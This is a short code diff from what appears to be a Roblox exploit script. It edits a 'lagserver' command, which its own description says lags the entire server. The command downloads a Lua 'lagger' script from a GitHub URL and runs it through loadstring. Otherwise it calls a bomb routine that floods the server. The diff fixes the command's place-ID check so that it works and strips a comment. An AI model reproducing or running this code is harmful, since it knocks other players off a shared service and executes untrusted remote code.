@@ -8454,7 +8454,7 @@ AddCommand("rejoin", {"rj"}, "rejoins the game you're currently in", {}, functio
 end)
 
 AddCommand("lagserver", {}, "lags the entire server", {}, function(Caller)
-	if game.PlaceId == 920587237 or 606849621 or 9103898828 or 5130598377 or 6804602922 then
+	if game.PlaceId == 920587237 or game.PlaceId == 606849621 or game.PlaceId == 9103898828 or game.PlaceId == 5130598377 or game.PlaceId == 6804602922 then
 		select(2, pcall(loadstring, game:HttpGet("https://raw.githubusercontent.com/daily3014/scripts/master/lagger.lua")))() 
 	else
 
@@ -8506,7 +8506,7 @@ AddCommand("lagserver", {}, "lags the entire server", {}, function(Caller)
 				end
 			end
 
-			bomb(289, 5) --// change values if client crashes
+			bomb(289, 5)
 		end
 	end
 end)
